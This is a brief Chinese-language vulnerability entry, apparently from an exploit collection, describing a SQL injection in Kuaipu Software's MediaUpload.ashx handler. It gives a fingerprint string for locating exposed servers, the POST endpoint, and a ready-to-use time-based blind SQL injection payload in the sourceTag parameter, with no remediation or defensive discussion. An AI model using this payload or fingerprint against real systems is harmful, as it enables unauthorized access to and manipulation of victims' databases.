# 快普软件MediaUpload.ashx存在SQL注入漏洞

快普软件 ｜ SQL注入 ｜ —
- **指纹**：`body="Resource/JavaScript/jKPM6.DateTime.js"`
- **请求**：`POST /ashx/Common/MediaUpload.ashx HTTP/1.1`

**Payload**
```
upload=check&dasdsa=1&sourceTag=11');WAITFOR DELAY '0 :0:5'--&field=1
```